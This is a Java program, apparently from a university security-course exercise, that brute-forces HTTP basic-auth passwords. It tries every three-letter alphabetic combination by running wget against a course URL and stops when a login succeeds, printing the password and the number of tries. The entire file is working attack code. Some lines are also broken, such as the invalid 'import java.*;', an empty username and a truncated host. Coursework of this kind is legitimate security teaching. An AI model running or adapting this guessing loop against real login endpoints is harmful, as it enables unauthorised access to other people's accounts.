

import java.io.*;
import java.*;

public class BruteForce 
{
   public static void main(String args[]) 
   {
      String s = null;
      String basic_url = "http://sec-crack.cs.rmit.edu./SEC/2/";

      
      String alphabets = new String("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
     
      String password = null;
      int len = 0;
      int num_tries = 0;

      len = alphabets.length();
      
      
      for (int i=0; i<len; i++)
      {
         for (int j=0; j<len; j++)
	 {
            for (int k=0; k<len; k++)
	    {
               try 
               {
                  
                  password = String.valueOf(alphabets.charAt(i)) + String.valueOf(alphabets.charAt(j)) + String.valueOf(alphabets.charAt(k));
               
                  System.out.print(alphabets.charAt(i)); 
                  System.out.print(alphabets.charAt(j)); 
                  System.out.println(alphabets.charAt(k));      

                  
                  Process p = Runtime.getRuntime().exec("wget --http-user= --http-passwd=" + password + " " + basic_url);
                  
                  BufferedReader stdInput = new BufferedReader(new 
                     InputStreamReader(p.getInputStream()));

                  BufferedReader stdError = new BufferedReader(new 
                     InputStreamReader(p.getErrorStream()));

                  
                  while ((s = stdInput.readLine()) != null)
                  {
                     System.out.println(s);
                  }
                  
                  
                  while ((s = stdError.readLine()) != null)
                  {
                     System.out.println(s);
                  }
                  
                  try
		      {
                     p.waitFor(); 
                  }
                  catch (InterruptedException g)  
                  {
                  }  

                  num_tries++;
                  
                  if((p.exitValue()) == 0)
                  {       
                     System.out.println("**********PASSWORD IS: " + password);
	             System.out.println("**********NUMBER OF TRIES: " + num_tries);
                     System.exit(1);
                  }
               }
               catch (IOException e)
               {
                  System.out.println("exception happened - here's what I know: ");
                  e.printStackTrace();
                  System.exit(-1);
               }
            }
         }
      }
   }
}

